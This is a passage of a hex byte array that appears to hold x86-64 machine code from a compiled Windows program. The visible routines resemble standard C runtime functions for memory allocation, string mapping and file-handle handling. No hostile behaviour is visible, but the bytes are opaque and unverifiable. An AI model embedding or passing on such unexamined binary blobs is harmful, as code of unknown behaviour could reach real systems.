0x48, 0x8b, 0xd1, 0x4d, 0x8b, 0xe0, 0x48, 0x8d, 0x4d, 0x0, 0xe8, 0xbe, 0xcb, 0xff, 0xff, 0x8b, 0xbd, 0x88, 0x0, 0x0, 0x0, 0x85, 0xff, 0x75, 0x7, 0x48, 0x8b, 0x45, 0x8, 0x8b, 0x78, 0xc, 0xf7, 0x9d, 0x90, 0x0, 0x0, 0x0, 0x45, 0x8b, 0xcf, 0x4d, 0x8b, 0xc4, 0x8b, 0xcf, 0x1b, 0xd2, 0x83, 0x64, 0x24, 0x28, 0x0, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x83, 0xe2, 0x8, 0xff, 0xc2, 0xe8, 0x50, 0xda, 0xff, 0xff, 0x4c, 0x63, 0xf0, 0x85, 0xc0, 0x75, 0x7, 0x33, 0xff, 0xe9, 0xda, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xf6, 0x48, 0x3, 0xf6, 0x48, 0x8d, 0x46, 0x10, 0x48, 0x3b, 0xf0, 0x48, 0x1b, 0xc9, 0x48, 0x23, 0xc8, 0xf, 0x84, 0xa7, 0x0, 0x0, 0x0, 0x48, 0x81, 0xf9, 0x0, 0x4, 0x0, 0x0, 0x77, 0x31, 0x48, 0x8d, 0x41, 0xf, 0x48, 0x3b, 0xc1, 0x77, 0xa, 0x48, 0xb8, 0xf0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf, 0x48, 0x83, 0xe0, 0xf0, 0xe8, 0x38, 0x37, 0x0, 0x0, 0x48, 0x2b, 0xe0, 0x48, 0x8d, 0x5c, 0x24, 0x30, 0x48, 0x85, 0xdb, 0x74, 0x1f, 0xc7, 0x3, 0xcc, 0xcc, 0x0, 0x0, 0xeb, 0x13, 0xe8, 0x7e, 0xed, 0xff, 0xff, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0xa, 0xc7, 0x0, 0xdd, 0xdd, 0x0, 0x0, 0x48, 0x83, 0xc3, 0x10, 0x48, 0x8b, 0xc3, 0x48, 0x85, 0xdb, 0x74, 0x50, 0x4c, 0x8b, 0xc6, 0x33, 0xd2, 0x48, 0x8b, 0xcb, 0xe8, 0xb7, 0x7c, 0xff, 0xff, 0x45, 0x8b, 0xcf, 0x44, 0x89, 0x74, 0x24, 0x28, 0x4d, 0x8b, 0xc4, 0x48, 0x89, 0x5c, 0x24, 0x20, 0xba, 0x1, 0x0, 0x0, 0x0, 0x8b, 0xcf, 0xe8, 0xa7, 0xd9, 0xff, 0xff, 0x44, 0x8b, 0xc0, 0x48, 0x8b, 0xc3, 0x45, 0x85, 0xc0, 0x74, 0x1c, 0x4c, 0x8b, 0x8d, 0x80, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd3, 0x41, 0x8b, 0xcd, 0xff, 0x15, 0x7d, 0x46, 0x0, 0x0, 0x8b, 0xf8, 0x48, 0x8b, 0xc3, 0xeb, 0x9, 0x33, 0xc0, 0x33, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x11, 0x48, 0x8d, 0x48, 0xf0, 0x81, 0x39, 0xdd, 0xdd, 0x0, 0x0, 0x75, 0x5, 0xe8, 0x2c, 0xc0, 0xff, 0xff, 0x80, 0x7d, 0x18, 0x0, 0x74, 0xb, 0x48, 0x8b, 0x45, 0x0, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x8b, 0xc7, 0x48, 0x8b, 0x4d, 0x20, 0x48, 0x33, 0xcd, 0xe8, 0x9d, 0x33, 0x0, 0x0, 0x48, 0x8b, 0x5d, 0x60, 0x48, 0x8b, 0x75, 0x68, 0x48, 0x8b, 0x7d, 0x70, 0x48, 0x8d, 0x65, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x60, 0x48, 0x8d, 0x6c, 0x24, 0x50, 0x48, 0x89, 0x5d, 0x40, 0x48, 0x89, 0x75, 0x48, 0x48, 0x89, 0x7d, 0x50, 0x48, 0x8b, 0x5, 0xea, 0xe4, 0x0, 0x0, 0x48, 0x33, 0xc5, 0x48, 0x89, 0x45, 0x8, 0x48, 0x63, 0x75, 0x60, 0x4d, 0x8b, 0xe1, 0x48, 0x89, 0x55, 0x0, 0x45, 0x8b, 0xe8, 0x48, 0x8b, 0xd9, 0x85, 0xf6, 0x7e, 0x14, 0x48, 0x8b, 0xd6, 0x49, 0x8b, 0xc9, 0xe8, 0x6b, 0x1b, 0x0, 0x0, 0x3b, 0xc6, 0x8d, 0x70, 0x1, 0x7c, 0x2, 0x8b, 0xf0, 0x44, 0x8b, 0x75, 0x78, 0x45, 0x85, 0xf6, 0x75, 0x7, 0x48, 0x8b, 0x3, 0x44, 0x8b, 0x70, 0xc, 0xf7, 0x9d, 0x80, 0x0, 0x0, 0x0, 0x44, 0x8b, 0xce, 0x4d, 0x8b, 0xc4, 0x41, 0x8b, 0xce, 0x1b, 0xd2, 0x83, 0x64, 0x24, 0x28, 0x0, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x83, 0xe2, 0x8, 0xff, 0xc2, 0xe8, 0xa0, 0xd8, 0xff, 0xff, 0x4c, 0x63, 0xf8, 0x85, 0xc0, 0xf, 0x84, 0x62, 0x2, 0x0, 0x0, 0x49, 0x8b, 0xc7, 0x48, 0x3, 0xc0, 0x48, 0x8d, 0x48, 0x10, 0x48, 0x3b, 0xc1, 0x48, 0x1b, 0xc0, 0x48, 0x23, 0xc1, 0xf, 0x84, 0x2d, 0x2, 0x0, 0x0, 0x48, 0xba, 0xf0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf, 0x48, 0x3d, 0x0, 0x4, 0x0, 0x0, 0x77, 0x2d, 0x48, 0x8d, 0x48, 0xf, 0x48, 0x3b, 0xc8, 0x77, 0x3, 0x48, 0x8b, 0xca, 0x48, 0x83, 0xe1, 0xf0, 0x48, 0x8b, 0xc1, 0xe8, 0x86, 0x35, 0x0, 0x0, 0x48, 0x2b, 0xe1, 0x48, 0x8d, 0x7c, 0x24, 0x50, 0x48, 0x85, 0xff, 0x74, 0x22, 0xc7, 0x7, 0xcc, 0xcc, 0x0, 0x0, 0xeb, 0x16, 0x48, 0x8b, 0xc8, 0xe8, 0xc9, 0xeb, 0xff, 0xff, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0xa, 0xc7, 0x0, 0xdd, 0xdd, 0x0, 0x0, 0x48, 0x83, 0xc7, 0x10, 0x48, 0x8b, 0xdf, 0x48, 0x85, 0xff, 0xf, 0x84, 0xca, 0x1, 0x0, 0x0, 0x44, 0x89, 0x7c, 0x24, 0x28, 0x44, 0x8b, 0xce, 0x4d, 0x8b, 0xc4, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xba, 0x1, 0x0, 0x0, 0x0, 0x41, 0x8b, 0xce, 0xe8, 0xfa, 0xd7, 0xff, 0xff, 0x85, 0xc0, 0xf, 0x84, 0xa5, 0x1, 0x0, 0x0, 0x48, 0x83, 0x64, 0x24, 0x40, 0x0, 0x45, 0x8b, 0xcf, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x4c, 0x8b, 0xc7, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x41, 0x8b, 0xd5, 0x4c, 0x8b, 0x65, 0x0, 0x83, 0x64, 0x24, 0x28, 0x0, 0x49, 0x8b, 0xcc, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0xe8, 0x60, 0xdd, 0xff, 0xff, 0x48, 0x63, 0xf0, 0x85, 0xc0, 0xf, 0x84, 0x68, 0x1, 0x0, 0x0, 0xba, 0x0, 0x4, 0x0, 0x0, 0x44, 0x85, 0xea, 0x74, 0x52, 0x8b, 0x45, 0x70, 0x85, 0xc0, 0xf, 0x84, 0x2a, 0x1, 0x0, 0x0, 0x3b, 0xf0, 0xf, 0x8f, 0x4b, 0x1, 0x0, 0x0, 0x48, 0x83, 0x64, 0x24, 0x40, 0x0, 0x45, 0x8b, 0xcf, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x4c, 0x8b, 0xc7, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x41, 0x8b, 0xd5, 0x89, 0x44, 0x24, 0x28, 0x49, 0x8b, 0xcc, 0x48, 0x8b, 0x45, 0x68, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x8, 0xdd, 0xff, 0xff, 0x8b, 0xf0, 0x85, 0xc0, 0xf, 0x85, 0xe8, 0x0, 0x0, 0x0, 0xe9, 0xc, 0x1, 0x0, 0x0, 0x48, 0x8b, 0xce, 0x48, 0x3, 0xc9, 0x48, 0x8d, 0x41, 0x10, 0x48, 0x3b, 0xc8, 0x48, 0x1b, 0xc9, 0x48, 0x23, 0xc8, 0xf, 0x84, 0xc8, 0x0, 0x0, 0x0, 0x48, 0x3b, 0xca, 0x77, 0x35, 0x48, 0x8d, 0x41, 0xf, 0x48, 0x3b, 0xc1, 0x77, 0xa, 0x48, 0xb8, 0xf0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf, 0x48, 0x83, 0xe0, 0xf0, 0xe8, 0x53, 0x34, 0x0, 0x0, 0x48, 0x2b, 0xe0, 0x48, 0x8d, 0x5c, 0x24, 0x50, 0x48, 0x85, 0xdb, 0xf, 0x84, 0x96, 0x0, 0x0, 0x0, 0xc7, 0x3, 0xcc, 0xcc, 0x0, 0x0, 0xeb, 0x13, 0xe8, 0x95, 0xea, 0xff, 0xff, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0xa, 0xc7, 0x0, 0xdd, 0xdd, 0x0, 0x0, 0x48, 0x83, 0xc3, 0x10, 0x48, 0x85, 0xdb, 0x74, 0x72, 0x48, 0x83, 0x64, 0x24, 0x40, 0x0, 0x45, 0x8b, 0xcf, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x4c, 0x8b, 0xc7, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x41, 0x8b, 0xd5, 0x89, 0x74, 0x24, 0x28, 0x49, 0x8b, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x20, 0xe8, 0x5e, 0xdc, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x31, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x33, 0xd2, 0x48, 0x21, 0x54, 0x24, 0x30, 0x44, 0x8b, 0xce, 0x8b, 0x45, 0x70, 0x4c, 0x8b, 0xc3, 0x41, 0x8b, 0xce, 0x85, 0xc0, 0x75, 0x2c, 0x21, 0x54, 0x24, 0x28, 0x48, 0x21, 0x54, 0x24, 0x20, 0xe8, 0xeb, 0xd6, 0xff, 0xff, 0x8b, 0xf0, 0x85, 0xc0, 0x75, 0x27, 0x48, 0x8d, 0x4b, 0xf0, 0x81, 0x39, 0xdd, 0xdd, 0x0, 0x0, 0x75, 0x5, 0xe8, 0x3c, 0xbd, 0xff, 0xff, 0x33, 0xf6, 0x48, 0x8b, 0xdf, 0xeb, 0x2b, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0x45, 0x68, 0x48, 0x89, 0x44, 0x24, 0x20, 0xeb, 0xce, 0x48, 0x8d, 0x4b, 0xf0, 0x81, 0x39, 0xdd, 0xdd, 0x0, 0x0, 0x75, 0xe0, 0xe8, 0x15, 0xbd, 0xff, 0xff, 0xeb, 0xd9, 0x33, 0xdb, 0x33, 0xf6, 0x48, 0x85, 0xdb, 0x74, 0x11, 0x48, 0x8d, 0x4b, 0xf0, 0x81, 0x39, 0xdd, 0xdd, 0x0, 0x0, 0x75, 0x5, 0xe8, 0xf9, 0xbc, 0xff, 0xff, 0x8b, 0xc6, 0x48, 0x8b, 0x4d, 0x8, 0x48, 0x33, 0xcd, 0xe8, 0x7b, 0x30, 0x0, 0x0, 0x48, 0x8b, 0x5d, 0x40, 0x48, 0x8b, 0x75, 0x48, 0x48, 0x8b, 0x7d, 0x50, 0x48, 0x8d, 0x65, 0x10, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5d, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x70, 0x48, 0x8b, 0xf2, 0x49, 0x8b, 0xd9, 0x48, 0x8b, 0xd1, 0x41, 0x8b, 0xf8, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0xe8, 0x1f, 0xc7, 0xff, 0xff, 0x8b, 0x84, 0x24, 0xc0, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x58, 0x89, 0x44, 0x24, 0x40, 0x4c, 0x8b, 0xcb, 0x8b, 0x84, 0x24, 0xb8, 0x0, 0x0, 0x0, 0x44, 0x8b, 0xc7, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8b, 0xd6, 0x8b, 0x84, 0x24, 0xb0, 0x0, 0x0, 0x0, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8b, 0x84, 0x24, 0xa8, 0x0, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x28, 0x8b, 0x84, 0x24, 0xa0, 0x0, 0x0, 0x0, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x6f, 0xfc, 0xff, 0xff, 0x80, 0x7c, 0x24, 0x68, 0x0, 0x74, 0xc, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0x83, 0xa1, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x4c, 0x8d, 0x5c, 0x24, 0x70, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x73, 0x18, 0x49, 0x8b, 0xe3, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x7f, 0xd1, 0xff, 0xff, 0x33, 0xc9, 0x84, 0xc0, 0xf, 0x94, 0xc1, 0x8b, 0xc1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x85, 0xc9, 0x75, 0x19, 0xe8, 0x7a, 0xbb, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x33, 0xba, 0xff, 0xff, 0x48, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x4c, 0x8b, 0xc1, 0x33, 0xd2, 0x48, 0x8b, 0xd, 0xf2, 0xf2, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0x48, 0xff, 0x25, 0x1f, 0x42, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x85, 0xc9, 0x75, 0xa, 0x48, 0x8b, 0xca, 0xe8, 0x97, 0xe8, 0xff, 0xff, 0xeb, 0x1f, 0x48, 0x85, 0xdb, 0x75, 0x7, 0xe8, 0xbb, 0xbb, 0xff, 0xff, 0xeb, 0x11, 0x48, 0x83, 0xfb, 0xe0, 0x76, 0x2d, 0xe8, 0x16, 0xbb, 0xff, 0xff, 0xc7, 0x0, 0xc, 0x0, 0x0, 0x0, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0xf6, 0xef, 0xff, 0xff, 0x85, 0xc0, 0x74, 0xdf, 0x48, 0x8b, 0xcb, 0xe8, 0x9a, 0xdf, 0xff, 0xff, 0x85, 0xc0, 0x74, 0xd3, 0x48, 0x8b, 0xd, 0x7f, 0xf2, 0x0, 0x0, 0x4c, 0x8b, 0xcb, 0x4c, 0x8b, 0xc7, 0x33, 0xd2, 0xff, 0x15, 0xb1, 0x41, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xd1, 0xeb, 0xc4, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0xf1, 0x48, 0x85, 0xc9, 0x74, 0x4a, 0x33, 0xdb, 0x4c, 0x8d, 0x3d, 0x1f, 0x4f, 0xff, 0xff, 0xbf, 0xe3, 0x0, 0x0, 0x0, 0x8d, 0x4, 0x1f, 0x41, 0xb8, 0x55, 0x0, 0x0, 0x0, 0x99, 0x49, 0x8b, 0xce, 0x2b, 0xc2, 0xd1, 0xf8, 0x48, 0x63, 0xe8, 0x48, 0x8b, 0xd5, 0x48, 0x8b, 0xf5, 0x48, 0x3, 0xd2, 0x49, 0x8b, 0x94, 0xd7, 0x50, 0x34, 0x1, 0x0, 0xe8, 0xf0, 0x16, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x29, 0x79, 0x5, 0x8d, 0x7d, 0xff, 0xeb, 0x3, 0x8d, 0x5d, 0x1, 0x3b, 0xdf, 0x7e, 0xc4, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x5f, 0xc3, 0x48, 0x3, 0xf6, 0x49, 0x63, 0x84, 0xf7, 0x58, 0x34, 0x1, 0x0, 0x85, 0xc0, 0x78, 0xd6, 0x3d, 0xe4, 0x0, 0x0, 0x0, 0x73, 0xcf, 0x48, 0x3, 0xc0, 0x41, 0x8b, 0x84, 0xc7, 0xf0, 0x19, 0x1, 0x0, 0xeb, 0xc4, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0xba, 0x48, 0x0, 0x0, 0x0, 0x8d, 0x4a, 0xf8, 0xe8, 0x27, 0xba, 0xff, 0xff, 0x33, 0xf6, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x5b, 0x48, 0x8d, 0xa8, 0x0, 0x12, 0x0, 0x0, 0x48, 0x3b, 0xc5, 0x74, 0x4c, 0x48, 0x8d, 0x78, 0x30, 0x48, 0x8d, 0x4f, 0xd0, 0x45, 0x33, 0xc0, 0xba, 0xa0, 0xf, 0x0, 0x0, 0xe8, 0xe0, 0xd8, 0xff, 0xff, 0x48, 0x83, 0x4f, 0xf8, 0xff, 0x48, 0x8d, 0x4f, 0xe, 0x80, 0x67, 0xd, 0xf8, 0x8b, 0xc6, 0x48, 0x89, 0x37, 0xc7, 0x47, 0x8, 0x0, 0x0, 0xa, 0xa, 0xc6, 0x47, 0xc, 0xa, 0x40, 0x88, 0x31, 0xff, 0xc0, 0x48, 0xff, 0xc1, 0x83, 0xf8, 0x5, 0x72, 0xf3, 0x48, 0x83, 0xc7, 0x48, 0x48, 0x8d, 0x47, 0xd0, 0x48, 0x3b, 0xc5, 0x75, 0xb8, 0x48, 0x8b, 0xf3, 0x33, 0xc9, 0xe8, 0x33, 0xba, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x4a, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0xb1, 0x0, 0x12, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xf9, 0x48, 0x3b, 0xce, 0x74, 0x12, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0xd9, 0x3e, 0x0, 0x0, 0x48, 0x83, 0xc7, 0x48, 0x48, 0x3b, 0xfe, 0x75, 0xee, 0x48, 0x8b, 0xcb, 0xe8, 0xd8, 0xb9, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x41, 0x57, 0x48, 0x83, 0xec, 0x30, 0x8b, 0xf1, 0x81, 0xf9, 0x0, 0x20, 0x0, 0x0, 0x72, 0x29, 0xe8, 0xc, 0xb9, 0xff, 0xff, 0xbb, 0x9, 0x0, 0x0, 0x0, 0x89, 0x18, 0xe8, 0xc4, 0xb7, 0xff, 0xff, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x74, 0x24, 0x48, 0x48, 0x8b, 0x7c, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0xc3, 0x33, 0xff, 0x8d, 0x4f, 0x7, 0xe8, 0x6e, 0xb3, 0xff, 0xff, 0x90, 0x8b, 0xdf, 0x8b, 0x5, 0x7d, 0xf4, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x3b, 0xf0, 0x7c, 0x36, 0x4c, 0x8d, 0x3d, 0x6d, 0xf0, 0x0, 0x0, 0x49, 0x39, 0x3c, 0xdf, 0x74, 0x2, 0xeb, 0x22, 0xe8, 0x90, 0xfe, 0xff, 0xff, 0x49, 0x89, 0x4, 0xdf, 0x48, 0x85, 0xc0, 0x75, 0x5, 0x8d, 0x78, 0xc, 0xeb, 0x14, 0x8b, 0x5, 0x4c, 0xf4, 0x0, 0x0, 0x83, 0xc0, 0x40, 0x89, 0x5, 0x43, 0xf4, 0x0, 0x0, 0x48, 0xff, 0xc3, 0xeb, 0xc1, 0xb9, 0x7, 0x0, 0x0, 0x0, 0xe8, 0x70, 0xb3, 0xff, 0xff, 0x8b, 0xc7, 0xeb, 0x8a, 0x48, 0x63, 0xd1, 0x4c, 0x8d, 0x5, 0x26, 0xf0, 0x0, 0x0, 0x48, 0x8b, 0xc2, 0x83, 0xe2, 0x3f, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xc, 0xd2, 0x49, 0x8b, 0x4, 0xc0, 0x48, 0x8d, 0xc, 0xc8, 0x48, 0xff, 0x25, 0xd9, 0x3d, 0x0, 0x0, 0xcc, 0x48, 0x63, 0xd1, 0x4c, 0x8d, 0x5, 0xfe, 0xef, 0x0, 0x0, 0x48, 0x8b, 0xc2, 0x83, 0xe2, 0x3f, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xc, 0xd2, 0x49, 0x8b, 0x4, 0xc0, 0x48, 0x8d, 0xc, 0xc8, 0x48, 0xff, 0x25, 0xb9, 0x3d, 0x0, 0x0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x48, 0x63, 0xd9, 0x85, 0xc9, 0x78, 0x72, 0x3b, 0x1d, 0xbe, 0xf3, 0x0, 0x0, 0x73, 0x6a, 0x48, 0x8b, 0xc3, 0x4c, 0x8d, 0x35, 0xb2, 0xef, 0x0, 0x0, 0x83, 0xe0, 0x3f, 0x48, 0x8b, 0xf3, 0x48, 0xc1, 0xee, 0x6, 0x48, 0x8d, 0x3c, 0xc0, 0x49, 0x8b, 0x4, 0xf6, 0xf6, 0x44, 0xf8, 0x38, 0x1, 0x74, 0x47, 0x48, 0x83, 0x7c, 0xf8, 0x28, 0xff, 0x74, 0x3f, 0xe8, 0xa8, 0x14, 0x0, 0x0, 0x83, 0xf8, 0x1, 0x75, 0x27, 0x85, 0xdb, 0x74, 0x16, 0x2b, 0xd8, 0x74, 0xb, 0x3b, 0xd8, 0x75, 0x1b, 0xb9, 0xf4, 0xff, 0xff, 0xff, 0xeb, 0xc, 0xb9, 0xf5, 0xff, 0xff, 0xff, 0xeb, 0x5, 0xb9, 0xf6, 0xff, 0xff, 0xff, 0x33, 0xd2, 0xff, 0x15, 0x98, 0x3e, 0x0, 0x0, 0x49, 0x8b, 0x4, 0xf6, 0x48, 0x83, 0x4c, 0xf8, 0x28, 0xff, 0x33, 0xc0, 0xeb, 0x16, 0xe8, 0xa5, 0xb7, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xe8, 0x7a, 0xb7, 0xff, 0xff, 0x83, 0x20, 0x0, 0x83, 0xc8, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0x7c, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x83, 0xf9, 0xfe, 0x75, 0x15, 0xe8, 0x4e, 0xb7, 0xff, 0xff, 0x83, 0x20, 0x0, 0xe8, 0x66, 0xb7, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xeb, 0x4e, 0x85, 0xc9, 0x78, 0x32, 0x3b, 0xd, 0xfc, 0xf2, 0x0, 0x0, 0x73, 0x2a, 0x48, 0x63, 0xc9, 0x4c, 0x8d, 0x5, 0xf0, 0xee, 0x0, 0x0, 0x48, 0x8b, 0xc1, 0x83, 0xe1, 0x3f, 0x48, 0xc1, 0xe8, 0x6, 0x48, 0x8d, 0x14, 0xc9, 0x49, 0x8b, 0x4, 0xc0, 0xf6, 0x44, 0xd0, 0x38, 0x1, 0x74, 0x7, 0x48, 0x8b, 0x44, 0xd0, 0x28, 0xeb, 0x1c, 0xe8, 0x3, 0xb7, 0xff, 0xff, 0x83, 0x20, 0x0, 0xe8, 0x1b, 0xb7, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xe8, 0xd4, 0xb5, 0xff, 0xff, 0x48, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xd8, 0x8b, 0xa, 0xe8, 0x60, 0xfe, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x3, 0x48, 0x63, 0x8, 0x48, 0x8b, 0xd1, 0x48, 0x8b, 0xc1, 0x48, 0xc1, 0xf8, 0x6, 0x4c, 0x8d, 0x5, 0x78, 0xee, 0x0, 0x0, 0x83, 0xe2, 0x3f, 0x48, 0x8d, 0x14, 0xd2, 0x49, 0x8b, 0x4, 0xc0, 0xf6, 0x44, 0xd0, 0x38, 0x1, 0x74, 0x23, 0xe8, 0x3d, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0xff, 0x15, 0x98, 0x3d, 0x0, 0x0, 0x33, 0xdb, 0x85, 0xc0, 0x75, 0x1d, 0xff, 0x15, 0xc, 0x3c, 0x0, 0x0, 0x8b, 0xd8, 0xe8, 0x7d, 0xb6, 0xff, 0xff, 0x89, 0x18, 0xe8, 0x96, 0xb6, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0x83, 0xcb, 0xff, 0x8b, 0xf, 0xe8, 0x26, 0xfe, 0xff, 0xff, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x38, 0x48, 0x63, 0xd1, 0x83, 0xfa, 0xfe, 0x75, 0xd, 0xe8, 0x63, 0xb6, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xeb, 0x6c, 0x85, 0xc9, 0x78, 0x58, 0x3b, 0x15, 0xf9, 0xf1, 0x0, 0x0, 0x73, 0x50, 0x48, 0x8b, 0xca, 0x4c, 0x8d, 0x5, 0xed, 0xed, 0x0, 0x0, 0x83, 0xe1, 0x3f, 0x48, 0x8b, 0xc2, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xc, 0xc9, 0x49, 0x8b, 0x4, 0xc0, 0xf6, 0x44, 0xc8, 0x38, 0x1, 0x74, 0x2d, 0x48, 0x8d, 0x44, 0x24, 0x40, 0x89, 0x54, 0x24, 0x50, 0x89, 0x54, 0x24, 0x58, 0x4c, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x8d, 0x54, 0x24, 0x58, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8d, 0x44, 0x24, 0x20, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0xe8, 0xfd, 0xfe, 0xff, 0xff, 0xeb, 0x13, 0xe8, 0xfa, 0xb5, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xe8, 0xb3, 0xb4, 0xff, 0xff, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 